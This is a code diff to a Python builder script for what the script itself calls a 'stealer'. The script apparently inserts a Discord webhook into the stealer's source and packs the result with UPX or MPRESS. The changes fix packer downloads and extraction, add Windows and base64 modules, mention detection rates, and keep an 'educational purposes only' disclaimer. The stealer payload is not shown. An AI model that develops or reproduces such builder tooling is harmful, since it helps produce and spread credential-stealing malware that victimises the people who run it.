@@ -71,17 +71,33 @@ def check_requirements():
         'threading',
         'subprocess',
         'datetime',
-        'zipfile'
+        'zipfile',
+        'base64'
     ]
     missing_modules = []
     for module in required_modules:
         try:
-            if module == 'discord.py':
+            module_name = module.split('>=')[0].split('==')[0].strip()
+            if module_name == 'discord.py':
                 __import__('discord')
+            elif module_name in ['socket', 'json', 'base64', 're', 'shutil', 'platform', 
+                               'threading', 'subprocess', 'datetime', 'zipfile']:
+                # These are standard library modules, no need to check
+                continue
+            elif module_name in ['win32gui', 'win32con', 'win32process', 'winreg']:
+                try:
+                    if module_name == 'winreg':
+                        import winreg
+                    else:
+                        __import__(module_name)
+                except ImportError:
+                    missing_modules.append(module_name)
             else:
-                __import__(module.split('.', maxsplit=1)[0])
+                __import__(module_name)
         except ImportError:
-            missing_modules.append(module)
+            # Only add the module name without version
+            module_name = module.split('>=')[0].split('==')[0].strip()
+            missing_modules.append(module_name)
     
     if missing_modules:
         print(f"{Fore.CYAN}[✿] Missing required modules: {', '.join(missing_modules)}")
@@ -210,14 +226,41 @@ def install_packers():
         try:
             if os.name == 'nt':
                 # Download UPX for Windows
-                url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"
+                url = "https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"
                 r = requests.get(url)
                 with open("upx.zip", "wb") as f:
                     f.write(r.content)
-                shutil.unpack_archive("upx.zip")
+                
+                # Create directory for extraction
+                if not os.path.exists("upx-extract"):
+                    os.makedirs("upx-extract")
+                
+                # Extract the zip file
+                with zipfile.ZipFile("upx.zip", 'r') as zip_ref:
+                    zip_ref.extractall("upx-extract")
+                
+                # Find the upx.exe in the extracted directory
+                upx_exe_path = None
+                for root, dirs, files in os.walk("upx-extract"):
+                    for file in files:
+                        if file == "upx.exe":
+                            upx_exe_path = os.path.join(root, file)
+                            break
+                    if upx_exe_path:
+                        break
+                
+                if upx_exe_path:
+                    # Copy upx.exe to current directory
+                    shutil.copy(upx_exe_path, "upx.exe")
+                    # Add current directory to PATH
+                    os.environ["PATH"] += os.pathsep + os.path.abspath(".")
+                    print(f"{Fore.GREEN}[+] UPX installed successfully{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}[!] Could not find upx.exe in the extracted files{Style.RESET_ALL}")
+                
+                # Clean up
                 os.remove("upx.zip")
-                # Add to PATH
-                os.environ["PATH"] += os.pathsep + os.path.abspath("upx-4.0.2-win64")
+                shutil.rmtree("upx-extract", ignore_errors=True)
             else:
                 # Install UPX using package manager
                 subprocess.run(["sudo", "apt-get", "install", "upx"], check=True)
@@ -233,20 +276,57 @@ def install_packers():
         print(f"{Fore.YELLOW}[!] MPRESS not found, installing...{Style.RESET_ALL}")
         try:
             if os.name == 'nt':
-                # Download MPRESS
-                url = "https://www.matcode.com/mpress.219.zip"
+                # Alternative MPRESS download URL
+                url = "https://www.autoitscript.com/autoit3/files/beta/autoit/archive/mpress-225.zip"
                 r = requests.get(url)
-                with open("mpress.zip", "wb") as f:
-                    f.write(r.content)
-                shutil.unpack_archive("mpress.zip")
-                os.remove("mpress.zip")
-                # Add to PATH
-                os.environ["PATH"] += os.pathsep + os.path.abspath("mpress")
-                print(f"{Fore.GREEN}[+] MPRESS installed successfully{Style.RESET_ALL}")
+                
+                if r.status_code != 200:
+                    # Try another alternative URL
+                    url = "https://github.com/matcode/mpress/releases/download/v2.19/mpress-219.zip"
+                    r = requests.get(url)
+                
+                if r.status_code == 200:
+                    with open("mpress.zip", "wb") as f:
+                        f.write(r.content)
+                    
+                    # Create directory for extraction
+                    if not os.path.exists("mpress-extract"):
+                        os.makedirs("mpress-extract")
+                    
+                    # Extract the zip file
+                    with zipfile.ZipFile("mpress.zip", 'r') as zip_ref:
+                        zip_ref.extractall("mpress-extract")
+                    
+                    # Find the mpress.exe in the extracted directory
+                    mpress_exe_path = None
+                    for root, dirs, files in os.walk("mpress-extract"):
+                        for file in files:
+                            if file.lower() == "mpress.exe":
+                                mpress_exe_path = os.path.join(root, file)
+                                break
+                        if mpress_exe_path:
+                            break
+                    
+                    if mpress_exe_path:
+                        # Copy mpress.exe to current directory
+                        shutil.copy(mpress_exe_path, "mpress.exe")
+                        # Add current directory to PATH
+                        os.environ["PATH"] += os.pathsep + os.path.abspath(".")
+                        print(f"{Fore.GREEN}[+] MPRESS installed successfully{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}[!] Could not find mpress.exe in the extracted files{Style.RESET_ALL}")
+                    
+                    # Clean up
+                    os.remove("mpress.zip")
+                    shutil.rmtree("mpress-extract", ignore_errors=True)
+                else:
+                    print(f"{Fore.RED}[!] Failed to download MPRESS: HTTP {r.status_code}{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}[!] Continuing without MPRESS...{Style.RESET_ALL}")
             else:
                 print(f"{Fore.RED}[!] MPRESS is only available for Windows{Style.RESET_ALL}")
         except Exception as e:
             print(f"{Fore.RED}[!] Failed to install MPRESS: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[!] Continuing without MPRESS...{Style.RESET_ALL}")
 
 def pack_executable(exe_path, packer=None):
     """Pack the executable to make it smaller."""
@@ -258,12 +338,24 @@ def pack_executable(exe_path, packer=None):
     try:
         if packer == "upx":
             print(f"{Fore.YELLOW}[!] Warning: UPX packing may increase detection rates{Style.RESET_ALL}")
-            subprocess.run(["upx", "--best", exe_path], check=True)
+            # Check if upx is in PATH or current directory
+            upx_path = "upx"
+            if os.path.exists("upx.exe"):
+                upx_path = os.path.abspath("upx.exe")
+            
+            subprocess.run([upx_path, "--best", exe_path], check=False)
+            print(f"{Fore.GREEN}[+] Executable packed successfully with UPX!{Style.RESET_ALL}")
         elif packer == "mpress":
-            subprocess.run(["mpress", "-s", exe_path], check=True)
-        print(f"{Fore.GREEN}[+] Executable packed successfully with {packer}!{Style.RESET_ALL}")
+            # Check if mpress is in PATH or current directory
+            mpress_path = "mpress"
+            if os.path.exists("mpress.exe"):
+                mpress_path = os.path.abspath("mpress.exe")
+            
+            subprocess.run([mpress_path, "-s", exe_path], check=False)
+            print(f"{Fore.GREEN}[+] Executable packed successfully with MPRESS!{Style.RESET_ALL}")
     except Exception as e:
         print(f"{Fore.RED}[!] Failed to pack executable: {str(e)}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
 
 def insert_webhook(webhook):
     """Insert the webhook URL into the stealer source code."""
@@ -566,7 +658,6 @@ def main():
     print(f"{Fore.CYAN}[✧] Checking requirements...{Style.RESET_ALL}")
     if not check_requirements():
         return
-    
     print(f"\n{Fore.YELLOW}[❀] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[❀] The authors are not responsible for any misuse or damage.{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[❀] By continuing, you agree to use this responsibly and legally.{Style.RESET_ALL}\n")
